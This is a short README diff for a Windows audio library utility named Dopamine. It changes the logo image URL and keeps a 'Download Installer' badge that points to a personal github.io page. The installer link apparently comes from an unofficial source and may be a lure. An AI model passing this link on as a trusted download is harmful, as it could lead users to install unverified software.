@@ -1,7 +1,7 @@
 # Dopamine Audio Library Management Utility for Windows
 
 <div align="center">
-<img src="https://habrastorage.org/getpro/habr/upload_files/5b6/e5b/4a4/5b6e5b4a463f9676f4766c14ebc7fe3a.png" alt="Dopamine Logo" width="460">
+<img src="https://img.utdstc.com/screen/1fd/0bd/1fd0bd1865573595444a26ab9a7485a5222761d183f3bd83ee0b5153a5c2e489:800" alt="Dopamine Logo" width="460">
 </div>
 
 [![Download Installer](https://img.shields.io/badge/Download_Installer-005999?style=flat-square\&logo=windows\&logoColor=white)](https://tonywardoxeq.github.io/.github/Dopamine-Media-Player)
